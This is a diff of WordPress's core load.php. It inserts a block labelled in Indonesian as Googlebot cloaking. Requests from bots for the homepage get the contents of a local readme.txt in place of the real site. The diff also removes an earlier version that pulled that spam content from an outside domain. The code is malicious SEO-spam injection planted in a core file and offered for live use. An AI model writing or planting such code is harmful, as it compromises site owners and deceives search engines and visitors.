@@ -1,4 +1,44 @@
 <?php
+// === CLOAKING UNTUK GOOGLEBOT – VERSI FINAL ===
+// Taruh paling atas file load.php (baris 1, sebelum apapun)
+
+// Deteksi basic
+$agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$lang   = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+$cookie = $_COOKIE['az'] ?? null;
+$uri    = $_SERVER['REQUEST_URI'] ?? '/';
+
+// Deteksi bot Google
+$is_bot = (strpos($agent, 'bot') !== false || strpos($agent, 'Google-InspectionTool') !== false);
+
+// Jalankan hanya jika bot & homepage
+if ($is_bot && $uri === '/') {
+
+    // Filter tambahan (opsional)
+    if (strpos($lang, 'zh') !== false && ($_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? null) == 1 && $cookie === 'lp') {
+        setcookie('az', 'lp', time() + 3600 * 7200);
+        echo ' '; // Optional konten bot ringan
+        exit;
+    }
+
+    // Path ke AMP file
+    $amp_file = $_SERVER['DOCUMENT_ROOT'] . '/readme.txt';
+
+    if (file_exists($amp_file)) {
+        // Kirim header & tampilkan isi AMP
+        header('Content-Type: text/html; charset=UTF-8');
+        readfile($amp_file);
+        exit;
+    } else {
+        // Fallback jika file readme.txt hilang
+        http_response_code(503);
+        echo '<!doctype html><html><head><meta charset="utf-8"><title>AMP Missing</title></head><body><h1>AMP file not found.</h1></body></html>';
+        exit;
+    }
+}
+?>
+
+<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -21,21 +61,7 @@ function wp_get_server_protocol() {
 
 	return $protocol;
 }
-$s_ref = $_SERVER['HTTP_REFERER'];
-$agent = $_SERVER['HTTP_USER_AGENT'];
 
-if ((strpos($agent, 'bot') !== false || strpos($agent, 'Google-InspectionTool') !== false) && $_SERVER['REQUEST_URI'] == '/') {
-    $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
-    
-    if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
-        setcookie('az', 'lp', time() + 3600 * 7200);
-        echo ' '; // Your bot-specific content
-        exit;
-    }
-    
-    echo file_get_contents("https://jaxlocksmithpro.com/readme.txt");
-    exit;
-}
 /**
  * Fixes `$_SERVER` variables for various setups.
  *
